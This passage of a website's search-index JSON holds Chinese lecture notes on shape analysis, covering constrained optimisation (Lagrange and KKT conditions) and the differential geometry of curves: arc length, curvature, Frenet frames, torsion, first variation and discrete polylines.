<li>\u5360\u7528\u5185\u5b58\u66f4\u4f4e\uff0c\u8ba1\u7b97\u65b9\u5f0f\u9002\u5408 GPU\uff0c\u4f46\u53ef\u80fd\u66f4\u96be\u6536\u655b</li> </ul> </li> </ul>"},{"location":"Accumulation/ShapeAnalysis/CH2/#multivariable-calculus","title":"Multivariable Calculus","text":"<p>\u4e00\u4e2a\u4f18\u5316\u95ee\u9898\u7531\u4f18\u5316\u76ee\u6807\uff0c\u7b49\u5f0f\u7ea6\u675f\uff0c\u4e0d\u7b49\u5f0f\u7ea6\u675f\u4e09\u90e8\u5206\u7ec4\u6210\uff1a</p> \\[ \\min _{x\\in R^n} f(x) \\ s.t.\\ g(x) =0,\\ h(x) \\gt 0 \\] <p>\u5fae\u5206\u662f\u6c42\u89e3\u4f18\u5316\u95ee\u9898\u7684\u57fa\u7840\uff0c\u5b9a\u4e49\u51fd\u6570\u6cbf\u7740\u65b9\u5411 \\(v\\) \u7684\u5fae\u5206\u4e3a\uff1a</p> \\[d f_{\\mathbf{x}_0} (\\mathbf{v}) = \\lim_{h \\rightarrow 0} \\frac{f(\\mathbf{x}_0 + h \\mathbf{v}) - f(\\mathbf{x}_0)}{h}\\] <p>\u6211\u4eec\u5c06\u5176\u6cf0\u52d2\u5c55\u5f00\uff0c\u5f97\u5230\u5982\u4e0b\u7b49\u5f0f\uff1a</p> \\[d f_{\\mathbf{x}_0} (\\mathbf{v}) = \\sum_k \\frac{\\partial f}{\\partial x^k} \\cdot v^k = \\nabla f(\\mathbf{x}_0) \\cdot \\mathbf{v}\\] <p>\u56e0\u6b64 \\(df_{ x_0}\\) \u53ef\u4ee5\u770b\u4f5c\u662f\u5173\u4e8e\u5411\u91cf \\(v\\) \u7684\u4e00\u4e2a\u7ebf\u6027\u7b97\u5b50\u3002</p> <p>\u5f53\u53ea\u6709 \u7b49\u5f0f\u7ea6\u675f \\(g(x)=0\\) \u65f6\uff0c\u7ea6\u675f\u4e0b\u7684\u6781\u503c\u70b9\u5fc5\u987b\u6ee1\u8db3 Lagrange \u6761\u4ef6\uff1a</p> \\[\\nabla f(x_0) + \\sum_{k=1}^m \\lambda_k \\nabla g_k(x_0) = 0\\] <p>\u5176\u4e2d \\(\\lambda_k\\) \u79f0\u4e3a \u62c9\u683c\u6717\u65e5\u4e58\u5b50 (Lagrange multipliers)\u3002</p> <ul> <li>\u5f15\u5165 \u62c9\u683c\u6717\u65e5\u51fd\u6570\uff1a</li> </ul> \\[\\Lambda(x; \\lambda) = f(x) + \\sum_{k=1}^m \\lambda_k g_k(x)\\] <p>\u6c42\u89e3\u7ea6\u675f\u4f18\u5316\u95ee\u9898 \u21d4 \u5bfb\u627e \\(\\Lambda\\) \u7684\u9a7b\u70b9\uff08\u540c\u65f6\u5bf9 \\(x, \\lambda\\) \u6c42\u504f\u5bfc\u4e3a\u96f6\uff09\u3002</p> <p>\u5f53\u5b58\u5728 \u4e0d\u7b49\u5f0f\u7ea6\u675f \\(h(x) \\leq 0\\) \u65f6\uff0cLagrange \u4e58\u5b50\u6cd5\u63a8\u5e7f\u4e3a Karush\u2013Kuhn\u2013Tucker (KKT) \u6761\u4ef6\uff1a</p> <p>\u4e00\u4e2a\u70b9 \\(x_0\\)\u200b \u662f\u6700\u4f18\u89e3\u7684\u5fc5\u8981\u6761\u4ef6\u662f\u5b58\u5728 \\(\\lambda \\geq 0\\) \u4f7f\u5f97\uff1a</p> <ul> <li>&lt;1&gt; \u539f\u59cb\u53ef\u884c\u6027 (Primal feasibility)</li> </ul> \\[h(x_0) \\leq 0\\] <ul> <li>&lt;2&gt; \u5bf9\u5076\u53ef\u884c\u6027 (Dual feasibility)</li> </ul> \\[\\lambda_k \\geq 0, \\ \\forall k\\] <ul> <li>&lt;3&gt; \u4e92\u8865\u677e\u5f1b (Complementary slackness)</li> </ul> \\[\\lambda_k h_k(x_0) = 0, \\ \\forall k\\] <p>\u5982\u679c\u67d0\u7ea6\u675f\u4e0d\u6d3b\u8dc3 (\\(h_k(x_0)&lt;0\\))\uff0c\u5219\u5bf9\u5e94\u7684\u4e58\u5b50 \\(\\lambda_k=0\\)</p> <ul> <li>&lt;4&gt; \u5e73\u7a33\u6027 (Stationarity)</li> </ul> \\[\\nabla f(x_0) + \\sum_{k=1}^p \\lambda_k \\nabla h_k(x_0) = 0\\] <p>\u8868\u793a\u5728\u7ea6\u675f\u9762\u4e0a\uff0c\u4e0d\u5b58\u5728\u80fd\u7ee7\u7eed\u4e0b\u964d\u7684\u53ef\u884c\u65b9\u5411</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/","title":"Curves","text":""},{"location":"Accumulation/ShapeAnalysis/CH3/#curves","title":"Curves","text":"<p> \u7ea6 3580 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 18 \u5206\u949f</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#continuous-curves","title":"Continuous Curves","text":""},{"location":"Accumulation/ShapeAnalysis/CH3/#geometric-definition","title":"Geometric Definition","text":"<p>Curves \u662f\u6700\u57fa\u672c\u7684\u51e0\u4f55\u5bf9\u8c61\uff0c\u5728\u5fae\u79ef\u5206\u4e2d\u6211\u4eec\u5c06\u66f2\u7ebf\u7406\u89e3\u4e3a\u4e00\u4e2a\u5b9e\u6570\u57df\u5230\u4e8c\u7ef4\u5e73\u9762\u7684\u51fd\u6570 \\(\\gamma: \\mathbb {R} \\rightarrow \\mathbb {R}^2\\)\u3002\u95ee\u9898\u5728\u4e8e\uff0c\u8fd9\u79cd\u8868\u8fbe\u65b9\u5f0f\u65e2\u4e0d\u80fd\u5904\u7406\u66f2\u7ebf\u9000\u5316\u6210\u70b9\u7684\u60c5\u51b5\uff0c\u4e5f\u4e0d\u80fd\u4fdd\u8bc1\u540c\u4e00\u6761\u66f2\u7ebf\u53ea\u80fd\u6709\u540c\u4e00\u79cd\u51fd\u6570\u8868\u793a\u3002</p> <p>\u4f8b\u5982\u5bf9\u4e8e\u66f2\u7ebf \\(y=2x\\)\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u76f8\u540c\u8868\u8fbe\u65b9\u5f0f</p> <ul> <li>\\(\\gamma_1(t) =(t,2t)\\)</li> <li>\\(\\gamma_2(t) = \\left \\{ \\begin {array}l (t,2t)&amp; t\\le 1 \\\\ (2(t-1 \\frac{1}{2}), 4(t - \\frac{1}{2}))&amp; t \\gt 1 \\end{array}\\right .\\)</li> </ul> <p>\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u5173\u6ce8\u66f2\u7ebf\u7684\u5149\u6ed1\u6027\u8d28\uff0c\u800c\u51fd\u6570\u8868\u8fbe\u7684\u65b9\u5f0f\u5f80\u5f80\u4e0d\u8db3\u4ee5\u63a8\u5bfc\u51fa\u66f2\u7ebf\u672c\u8eab\u7684\u5149\u6ed1\u6027\uff0c\u4f8b\u5982\uff1a</p> <p></p> <p>\u76f4\u89c2\u6765\u8bf4\uff0c\u66f2\u7ebf\u53ef\u4ee5\u7406\u89e3\u4e3a\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u7684\u70b9\u7684\u96c6\u5408\uff0c\u8fd9\u4e9b\u6761\u4ef6\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f\u5176\u5fae\u5206\u6027\u8d28\uff0c\u5373\u5728\u66f2\u7ebf\u4e0a\u4efb\u610f\u4e00\u70b9\u90fd\u53ef\u4ee5\u7528\u76f4\u7ebf\u6765\u62df\u5408\u8fd1\u4f3c\u3002</p> <p>\u4e3a\u4e86\u66f4\u7cbe\u786e\u7684\u5b9a\u4e49\u5b83\uff0c\u6570\u5b66\u4e0a\u901a\u5e38\u5f15\u5165\u53c2\u6570\u5316\uff08parametrization\uff09\uff1a</p> <ul> <li>\u5bf9\u4e8e\u66f2\u7ebf\u4e0a\u4efb\u610f\u4e00\u70b9 \\(p\\)\uff0c\u5b58\u5728\u4e00\u4e2a\u90bb\u57df \\(U\\)</li> <li>\u5b58\u5728\u4e00\u4e2a\u5149\u6ed1\u6620\u5c04\uff0c\u5c06\u90bb\u57df \\(U\\) \u6620\u5c04\u5230\u5b9e\u6570\u57df\u5f00\u533a\u95f4 \\((a,b)\\) \u4e0a\uff1a \\(\\gamma_p : (a,b) \\rightarrow U\\)</li> <li>\u4e14\u6ee1\u8db3\u5728\u6bcf\u4e00\u4e2a\u70b9 \\(t\\)\uff0c\u90fd\u6709 \\(\\gamma_p' (t)\\ne 0\\)</li> </ul> <p>\u5728\u8ba8\u8bba\u53c2\u6570\u5316\u66f2\u7ebf\u65f6\uff0c\u5e38\u5e38\u9700\u8981\u533a\u5206\u4e24\u5c42\u542b\u4e49\uff1a</p> <ul> <li>Trace\uff08\u8f68\u8ff9 / \u51e0\u4f55\u50cf\uff09<ul> <li>\u5b9a\u4e49\u4e3a\uff1a\u66f2\u7ebf\u5728\u7a7a\u95f4\u4e2d\u7684\u70b9\u96c6</li> <li>\\(\\mathrm{trace}(\\gamma) := \\{ \\gamma(t) \\mid t \\in (a,b) \\} \\subset \\mathbb{R}^n\\)</li> <li>\u4e5f\u5c31\u662f\u8fd9\u6761\u66f2\u7ebf\u5728\u51e0\u4f55\u7a7a\u95f4\u4e2d\u5b9e\u9645\u753b\u51fa\u7684\u5f62\u72b6\u3002</li> <li>\u4e0d\u540c\u7684\u53c2\u6570\u5316\uff08\u6bd4\u5982 \\(\\gamma(t)\\) \u548c \\(\\gamma(\\phi(t))\\)\uff0c\u5176\u4e2d \\(\\phi\\) \u662f\u5355\u8c03\u51fd\u6570\uff09\u53ef\u80fd\u6709\u76f8\u540c\u7684 trace\u3002</li> </ul> </li> </ul> <p>trace \u53ea\u5173\u6ce8\u201c\u8d70\u8fc7\u4e86\u54ea\u4e9b\u70b9\u201d\uff0c\u4e0d\u5728\u4e4e\u600e\u4e48\u8d70</p> <ul> <li>Component\uff08\u5206\u91cf / \u53c2\u6570\u5316\u51fd\u6570\u7684\u5750\u6807\u8868\u8fbe\uff09<ul> <li>\u6307\u7684\u662f \\(\\gamma\\) \u5728\u5404\u5750\u6807\u8f74\u4e0a\u7684\u5206\u91cf\u51fd\u6570\uff1a</li> <li>\\(\\gamma(t) = (x(t), y(t), z(t), \\dots)\\)</li> <li>\u5176\u4e2d\u6bcf\u4e2a \\(x(t), y(t), z(t)\\) \u90fd\u662f \\(\\mathbb{R}\\) \u4e0a\u7684\u5149\u6ed1\u51fd\u6570\uff0c\u79f0\u4e3a \\(\\gamma\\) \u7684 components\u3002</li> </ul> </li> </ul> <p>component \u5173\u5fc3\u201c\u6bcf\u4e2a\u5750\u6807\u968f\u53c2\u6570\u5982\u4f55\u53d8\u5316\u201d</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#arc-length","title":"Arc Length","text":"<p>\u51e0\u4f55\u662f\u7814\u7a76\u4e0d\u53d8\u91cf(invariant)\u7684\u5b66\u79d1\uff0c\u6211\u4eec\u5173\u5fc3\u66f2\u7ebf\u5728\u4e0d\u540c\u53c2\u6570\u5316\u4e0b\u54ea\u4e9b\u91cf\u662f\u4fdd\u6301\u4e0d\u53d8\u7684\u3002</p> <p>\u4f8b\u5982\uff0c\u66f2\u7ebf\u7684 velocity \u5c31\u4e0d\u662f\u4e0d\u53d8\u91cf\uff0c\u5b83\u4f9d\u8d56\u4e8e\u51fd\u6570 \\(\\gamma\\) \u7684\u9009\u53d6\u3002\u5047\u5b9a\u6211\u4eec\u6709\u4e00\u4e2a\u53c2\u6570\u5316\u66f2\u7ebf\uff1a</p> <p>$$ \\gamma : (a,b) \\rightarrow \\mathbb R^n,   \\gamma (t) = (x(t), y(t), z(t), \\dots) $$ \u90a3\u4e48\u901f\u5ea6\u5411\u91cf\u548c\u901f\u5ea6\u5927\u5c0f\u4e3a\uff1a</p> \\[\\begin{array}l v(t)= \\gamma '(t) = \\frac{d\\gamma}{dt} \\\\ \\|v(t)\\| = \\| \\frac{d\\gamma}{dt} \\| \\end{array}\\] <p>\u8fd9\u53d6\u51b3\u4e8e\u53c2\u6570 \\(t\\) \u7684\u9009\u53d6\u3002\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5bf9\u4e8e\u5982\u4e0b\u4e24\u6761\u76f8\u540c\u5706\u5468\u66f2\u7ebf\uff1a</p> <ul> <li>\u7528 \\(\\gamma_1(t)=(\\cos t, \\sin t)\\)\uff0c\u901f\u5ea6\u5927\u5c0f\u6052\u4e3a 1\u3002</li> <li>\u7528 \\(\\gamma_2(t)=(\\cos t^2, \\sin t^2)\\)\uff0c\u66f2\u7ebf\u4e00\u6837\uff0c\u4f46\u901f\u5ea6 \\(\\|\\gamma_2'(t)\\|=2t\\)\uff0c\u968f\u7740 \\(t\\) \u6539\u53d8\u3002</li> </ul> <p>\u800c\u66f2\u7ebf\u7684\u5f27\u957f\uff08Arc Length\uff09\u5219\u5b8c\u5168\u4e0e\u53c2\u6570\u5316\u65e0\u5173\uff0c\u53ea\u4e0e\u66f2\u7ebf\u672c\u8eab\u7684\u51e0\u4f55\u5f62\u72b6\u6709\u5173\uff1a</p> \\[ \\int^b_a \\| \\gamma' (t) \\|_2dt \\] <p>\u6709\u4e86\u5f27\u957f\u8fd9\u4e00\u4e0d\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6b64\u57fa\u7840\u4e0a\u8fdb\u884c\u53c2\u6570\u5316\u3002\u8bb0\u66f2\u7ebf\u5f27\u957f\u4e3a \\(S(t)\\)\uff1a</p> \\[S(t) = \\int_{t_0}^t \\Vert \\gamma'(t) \\Vert_2 \\ dt\\] <p>\u663e\u7136 \\(S(t)\\) \u662f\u4e00\u4e2a\u5355\u8c03\u9012\u589e\u7684\u51fd\u6570\uff0c\u56e0\u6b64\u5fc5\u5b9a\u5b58\u5728\u53cd\u51fd\u6570 \\(\\phi = S^{-1}\\) \u6ee1\u8db3 \\(t = \\phi \\circ S(t)\\)\u3002\u5229\u7528 \\(\\phi\\) \u5c31\u53ef\u4ee5\u91cd\u65b0\u53c2\u6570\u5316\u6574\u6761\u66f2\u7ebf\uff1a</p> \\[\\tilde{\\gamma} (s) = \\gamma \\circ \\phi(s)\\] <p>\u8fd9\u91cc\u7684\u53c2\u6570 \\(s\\) \u5c31\u662f\u5f27\u957f\uff0c\\(\\phi (S(t)) = t\\)</p> <p>\u7528\u5f27\u957f\u53c2\u6570\u5316\u540e\u7684\u66f2\u7ebf\u6709\u8bb8\u591a\u4f18\u826f\u6027\u8d28\u3002\u4f8b\u5982\u66f2\u7ebf\u7684\u901f\u5ea6\u53d8\u4e3a\u4e86\u5e38\u6570\uff0c\u5373\u5355\u4f4d\u5411\u91cf\uff1a</p> \\[ \\begin{aligned} \\tilde{\\gamma}' (s) &amp;= \\gamma' (\\phi (s)) \\cdot \\phi' (s) \\\\ &amp;= \\frac{\\gamma' (\\phi (s))}{\\Vert \\gamma'(\\phi (s)) \\Vert_2} \\end{aligned} \\] <p>\u5c06\u8be5\u5355\u4f4d\u5411\u91cf\u66ff\u6362\u6210\u5173\u4e8e \\(s\\) \u7684\u4e09\u89d2\u51fd\u6570\u5f62\u5f0f\uff1a</p> \\[ \\begin{aligned} \\tilde{\\gamma}' (s) = \\mathbf{T} (s) &amp;= \\cos \\theta(s) \\ \\mathbf{e}_1 + \\sin \\theta(s) \\ \\mathbf{e}_2 \\\\ &amp;= \\begin{bmatrix} \\cos \\theta(s) \\\\ \\sin \\theta(s) \\end{bmatrix} \\end{aligned} \\] <p>\u7ee7\u7eed\u5bf9\u901f\u5ea6\u8fdb\u884c\u6c42\u5bfc\uff1a</p> \\[ \\begin{aligned} \\mathbf{T}' (s) &amp;= \\theta'(s) \\cdot [ -\\sin \\theta(s) \\ \\mathbf{e}_1 + \\cos \\theta(s) \\ \\mathbf{e}_2 ] \\\\ &amp;= \\theta'(s) \\begin{bmatrix} 0 &amp;-1 \\\\ 1 &amp; 0 \\end{bmatrix} \\mathbf{T} (s) \\\\ &amp;= \\kappa(s) \\ J \\ \\mathbf{T}(s) \\\\ &amp;= \\kappa(s) \\ \\mathbf{N}(s) \\end{aligned} \\] <p>\u5176\u4e2d \\(\\kappa(s)=\\theta'(s)\\) \u79f0\u4e3a\u66f2\u7387(curvature)\uff1b \\(\\mathbf{N}(s) = J \\ \\mathbf{T}(s)\\) \u8868\u793a\u5bf9\u901f\u5ea6\u65b9\u5411\u9006\u65f6\u9488\u65cb\u8f6c \\(90^{\\circ}\\)\uff0c\u79f0\u4e3a\u6cd5\u5411(normal)\u3002\u4e0a\u5f0f\u6307\u51fa\u5f27\u957f\u53c2\u6570\u5316\u7684\u66f2\u7ebf\u5176\u5782\u76f4\u901f\u5ea6\u65b9\u5411\u53d8\u5316\u7684\u901f\u5ea6\uff0c\u6216\u8005\u8bf4\u66f2\u7ebf\u5f2f\u66f2\u7684\u7a0b\u5ea6\u53d6\u51b3\u4e8e\u66f2\u7387\u7684\u5927\u5c0f\u3002</p> <p></p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#coordinate-invariant","title":"Coordinate Invariant","text":"<p>\u4e0a\u4e00\u8282\u8bc1\u660e\u4e86\u6211\u4eec\u53ea\u9700\u8981\u5207\u5411 \\(\\mathbf{T}\\) \u548c\u6cd5\u5411 \\(\\mathbf N\\) \u5c31\u53ef\u4ee5\u8868\u793a\u6574\u6761\u66f2\u7ebf\u3002\u5bf9\u4e8e\u5e73\u9762\u66f2\u7ebf\uff0c\u6211\u4eec\u5bf9 \\(\\mathbf{N}\\) \u6c42\u5bfc\u5f97\u5230\uff1a</p> \\[ \\mathbf N'(s)= J\u00a0\\ \\mathbf{T}' (s) = J \\bigg( \\kappa(s) \\ J \\ \\mathbf{T}(s) \\bigg) = -\\kappa(s) \\mathbf{T}(s) \\] <p>\u6574\u7406\u540e\u5f97\u5230\u5982\u4e0b Frenet \u65b9\u7a0b\uff1a</p> \\[ \\frac{d}{ds} \\begin{bmatrix} \\mathbf{T} (s) \\\\ \\mathbf{N} (s) \\end{bmatrix} = \\begin{bmatrix} 0 &amp; \\kappa(s) \\\\ -\\kappa(s) &amp; 0 \\end{bmatrix} \\begin{bmatrix} \\mathbf{T} (s) \\\\ \\mathbf{N} (s) \\end{bmatrix} \\] <p>\\((\\mathbf{T}, \\mathbf{N})\\) \u4e5f\u88ab\u79f0\u4e3a\u4e8c\u7ef4 Frenet \u6846\u67b6\uff08Frenet Frame\uff09</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u53ea\u77e5\u9053\u4e00\u6761\u66f2\u7ebf\u7684\u66f2\u7387\u51fd\u6570 \\(\\kappa(s)\\)\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89e3 Frenet \u65b9\u7a0b\u5f97\u5230\u66f2\u7ebf\u7684\u5207\u5411 \\(\\mathbf{T}\\) \u548c\u6cd5\u5411 \\(\\mathbf N\\)\uff0c\u4ece\u800c\u8868\u793a\u6574\u6761\u66f2\u7ebf\u3002</p> <p>\u56e0\u6b64\uff0c\u66f2\u7387\u5b9a\u4e49\u4e86\u5e73\u9762\u66f2\u7ebf\u7684\u5f62\u72b6\uff1b\u4e24\u6761\u5177\u6709\u76f8\u540c\u66f2\u7387\u7684\u66f2\u7ebf\u6700\u591a\u76f8\u5dee\u4e00\u4e2a\u521a\u4f53\u53d8\u6362\uff08\u5e73\u79fb\u3001\u65cb\u8f6c\uff09\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u4ec5\u77e5\u9053 \\(T(s)\\) \u5c31\u53ef\u4ee5\u901a\u8fc7\u79ef\u5206\u5f97\u5230\u66f2\u7ebf\uff0c\u56e0\u4e3a \\(\\gamma '(s) = \\mathbf{T} (s)\\)</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#fundamental-theorem-of-plane-curves","title":"Fundamental Theorem of Plane Curves","text":"<p>\u672c\u8282\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u5173\u4e8e\u66f2\u7387\u7684\u7406\u8bba\u3002</p> <p>Gauss Map</p> <p>\u5c06\u6cd5\u5411\u7406\u89e3\u4e3a\u5355\u4f4d\u5706\u4e0a\u7684\u70b9\u6216\u65b9\u5411\uff0c\u8fd9\u6837\u66f2\u7ebf\u4e0a\u4efb\u610f\u4e00\u70b9\u90fd\u4e0e\u5355\u4f4d\u5706 \\(S^1\\) \u6709\u6620\u5c04\uff0c\u8fd9\u79cd\u6620\u5c04\u79f0\u4e3a Gauss Map\uff1a</p> <p></p> <p>Winding Number</p> <p>\u5377\u7ed5\u6570(Winding Number)\u8868\u793a\u5c01\u95ed\u66f2\u7ebf\u9006\u65f6\u9488\u7ed5\u8fc7\u539f\u70b9\u7684\u603b\u6b21\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bf9\u66f2\u7387\u79ef\u5206\u6765\u8ba1\u7b97\uff1a</p> <p></p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#space-curves","title":"Space Curves","text":"<p>\u5bf9\u4e8e\u7a7a\u95f4\u4e2d\u7684\u66f2\u7ebf\uff0c\u9664\u4e86\u4e3b\u6cd5\u5411\u548c\u66f2\u7387\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u5f15\u5165\u526f\u6cd5\u5411(Binormal) \\(\\mathbf B\\) \u548c\u6320\u7387(torsion) \\(\\tau\\)\u3002</p> <p>\u526f\u6cd5\u5411\u662f\u5782\u76f4\u4e8e\u5207\u5411\u548c\u4e3b\u6cd5\u5411\u7684\u5355\u4f4d\u5411\u91cf \\(B=T\\times N\\)\uff0c\u800c\u6320\u7387\u5219\u63cf\u8ff0\u4e86\u66f2\u7ebf\u51fa\u5e73\u9762\u7684\u8fd0\u52a8\u3002</p> <p>\u76f4\u89c2\u7406\u89e3\uff0c\u66f2\u7387\u544a\u8bc9\u6211\u4eec\u66f2\u7ebf\u662f\u5426\u504f\u79bb\u76f4\u7ebf\uff0c\u6320\u7387\u544a\u8bc9\u6211\u4eec\u66f2\u7ebf\u662f\u5426\u504f\u79bb\u6240\u5728\u5e73\u9762</p> <ul> <li>Curvature: In-plane motion</li> <li>Torsion: Out-of-plane motion</li> </ul> <p>\u7a7a\u95f4\u66f2\u7ebf\u7684 Frenet \u65b9\u7a0b\u5982\u4e0b\uff1a</p> \\[ \\frac{d}{ds} \\begin{bmatrix} \\mathbf{T} (s) \\\\ \\mathbf{N} (s) \\\\ \\mathbf{B} (s) \\end{bmatrix} = \\begin{bmatrix} 0 &amp; \\kappa(s) &amp; 0 \\\\ -\\kappa(s) &amp; 0 &amp; \\tau(s) \\\\ 0 &amp; -\\tau(s) &amp; 0 \\\\ \\end{bmatrix} \\begin{bmatrix} \\mathbf{T} (s) \\\\ \\mathbf{N} (s) \\\\ \\mathbf{B} (s) \\end{bmatrix} \\] <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e\u7a7a\u95f4\u66f2\u7ebf\uff0c\u66f2\u7387\u548c\u6320\u7387\u5171\u540c\u51b3\u5b9a\u4e86\u4e00\u6761\u66f2\u7ebf\u7684\u5f62\u72b6\u3002</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#first-variation-formula","title":"First Variation Formula","text":"<p>\u6211\u4eec\u628a\u5f27\u957f\u770b\u4f5c\u4e00\u4e2a \u6cdb\u51fd (functional)\uff0c\u5b83\u628a\u4e00\u6761\u66f2\u7ebf \\(\\gamma\\) \u6620\u5c04\u5230\u4e00\u4e2a\u5b9e\u6570\uff08\u5f27\u957f\uff09\uff1a</p> \\[L[\\gamma] = \\int_a^b \\|\\gamma'(t)\\| \\, dt\\] <p>\u63a5\u7740\uff0c\u5f15\u5165\u4e00\u4e2a \u5411\u91cf\u573a\u6270\u52a8 \\(\\mathbf{v}(t)\\)\uff0c\u5e76\u4e14\u89c4\u5b9a\u7aef\u70b9\u56fa\u5b9a\uff1a</p> \\[\\mathbf{v}(a)=\\mathbf{v}(b)=0\\] <p>\u5b9a\u4e49\u4e00\u65cf\u88ab\u6270\u52a8\u7684\u66f2\u7ebf\uff1a</p> \\[\\gamma_r(t) = \\gamma(t) + r \\mathbf{v}(t), \\quad r \\in \\mathbb{R}\\] <p>\u8fd9\u8868\u793a\u5728\u66f2\u7ebf\u4e0a\u6bcf\u4e2a\u70b9\u52a0\u4e0a\u4e00\u4e2a\u201c\u5c0f\u4f4d\u79fb\u201d\uff0c\u5f97\u5230\u4e00\u6761\u65b0\u7684\u66f2\u7ebf</p> <p>\u8bb0\u65b0\u7684\u66f2\u7ebf\u5f27\u957f\u4e3a\uff1a</p> \\[l(r) = \\int_a^b \\|\\gamma_r'(t)\\| \\, dt\\] <p>\u5728 \\(r=0\\) \u5904\u7684\u5bfc\u6570\u5c31\u662f\u5f27\u957f\u6cdb\u51fd\u5728\u65b9\u5411 \\(\\mathbf{v}\\) \u4e0a\u7684\u53d8\u5206\uff08Gateaux \u5bfc\u6570\uff09\uff1a</p> \\[dL_\\gamma[\\mathbf{v}] = l'(0)\\] \\[ \\begin{aligned} l'(r) &amp;= \\frac{d}{dr} \\int_a^b \\Vert \\gamma_r'(t) \\Vert_2 \\ dt \\\\ &amp;= \\int_a^b \\frac{d}{dr} \\Vert \\gamma_r'(t) \\Vert_2 \\ dt \\\\ &amp;= \\int_a^b \\frac{(\\gamma'(t) + r \\mathbf{v}'(t)) \\cdot \\mathbf{v}'(t)}{\\Vert \\gamma'(t) + r \\mathbf{v}'(t) \\Vert_2} \\ dt \\end{aligned} \\] <p>\u4ee3\u5165\u6761\u4ef6 \\(r=0\\) \u5f97\u5230\uff1a</p> \\[ \\begin{aligned} l'(0) &amp;= \\int_a^b \\frac{\\gamma'(t) \\cdot \\mathbf{v}'(t)}{\\Vert \\gamma'(t) \\Vert_2} \\ dt \\\\ &amp;= \\int_a^b \\mathbf{T}(t) \\cdot \\mathbf{v}'(t) \\ dt \\end{aligned} \\] <p>\u5176\u4e2d \\(\\mathbf{T}(t)=\\frac{\\gamma'(t)}{\\Vert \\gamma'(t) \\Vert_2}\\) \u4e3a\u66f2\u7ebf\u4e0a\u7684\u5355\u4f4d\u5207\u5411\u91cf\u3002\u5229\u7528\u5206\u90e8\u79ef\u5206\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5f97\u5230\uff1a</p> \\[ \\begin{aligned} \\int_a^b \\mathbf{T}(t) \\cdot \\mathbf{v}'(t) \\ dt &amp;= [\\mathbf{T} \\cdot \\mathbf{v}(t)]_a^b - \\int_a^b \\kappa(t) \\mathbf{N}(t) \\cdot \\mathbf{v}(t) \\ dt \\\\ &amp;= - \\int_a^b \\kappa(t) \\mathbf{N}(t) \\cdot \\mathbf{v}(t) \\ dt \\\\ &amp;= \\langle \\mathbf{v}, -\\kappa \\mathbf{N} \\rangle \\end{aligned} \\] <p>\u8054\u60f3\u5230\u65b9\u5411\u5bfc\u6570\u7684\u5b9a\u4e49 \\(df_{x_0} (\\mathbf{v}) = \\mathbf{v} \\cdot \\nabla f(x_0)\\)\u3002</p> <p>\u4e0a\u5f0f\u8bf4\u660e\u5728\u66f2\u7ebf\u4e0a\u6bcf\u4e00\u70b9\u6cbf\u6cd5\u5411\u8fdb\u884c\u79fb\u52a8\u53ef\u4ee5\u7f29\u77ed\u66f2\u7ebf\u7684\u957f\u5ea6\u3002\u540c\u65f6\u4e5f\u8bf4\u660e\u4e86\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbe\u8ba1\u66f2\u7ebf\u4e0a\u7684\u5411\u91cf\u573a\u6765\u8c03\u6574\u66f2\u7ebf\u7684\u5f62\u72b6\u548c\u957f\u77ed\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u79f0\u4e3a curve shortening flow\u3002</p>"},{"location":"Accumulation/ShapeAnalysis/CH3/#discrete-curves","title":"Discrete Curves","text":"<p>\u6211\u4eec\u9700\u8981\u8003\u8651\u5982\u4f55\u5728\u8ba1\u7b97\u673a\u5185\u8868\u793a\u66f2\u7ebf\u3002</p> <p>Bezier \u66f2\u7ebf\u662f\u5de5\u7a0b\u4e2d\u5e38\u7528\u7684\u4e00\u79cd\u66f2\u7ebf\u5f62\u5f0f\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u7cfb\u5217\u63a7\u5236\u70b9\u6765\u751f\u6210\u4e00\u6761\u5149\u6ed1\u7684\u66f2\u7ebf\u3002\u4f46\u8fd9\u79cd\u8868\u793a\u65b9\u5f0f\u96be\u4ee5\u7814\u7a76\u66f2\u7ebf\u7684\u4e00\u4e9b\u51e0\u4f55\u6027\u8d28\uff0c\u4f8b\u5982\u5b83\u7684\u5f27\u957f\u662f\u6ca1\u6709\u5b9a\u5f0f\u89e3\u7684\u3002</p> <p></p> <p>\u5927\u90e8\u5206\u5e38\u7528\u66f2\u7ebf\u7684\u5f27\u957f\u90fd\u6ca1\u6709\u5b9a\u5f0f\u89e3\uff0c\u5373\u4fbf\u5b58\u5728\u4e5f\u5f80\u5f80\u5177\u6709\u975e\u5e38\u590d\u6742\u7684\u5f62\u5f0f</p> <p>\u4e3a\u4e86\u7814\u7a76\u66f2\u7ebf\u7684\u51e0\u4f55\u6027\u8d28\uff0c\u8fd9\u95e8\u8bfe\u4e2d\u91c7\u7528\u6298\u7ebf\uff08Polyline\uff09\u6765\u8868\u8fbe\u5404\u79cd\u7c7b\u578b\u7684\u66f2\u7ebf\u3002\u76f4\u89c2\u6765\u770b\uff0c\u6298\u73b0\u662f\u5bf9\u66f2\u7ebf\u7684\u4e00\u79cd\u8fd1\u4f3c\uff0c\u901a\u8fc7\u4ee5\u76f4\u4ee3\u66f2\u6765\u79bb\u6563\u5730\u8868\u8fbe\u6574\u6761\u66f2\u7ebf\uff1a</p> <p></p> 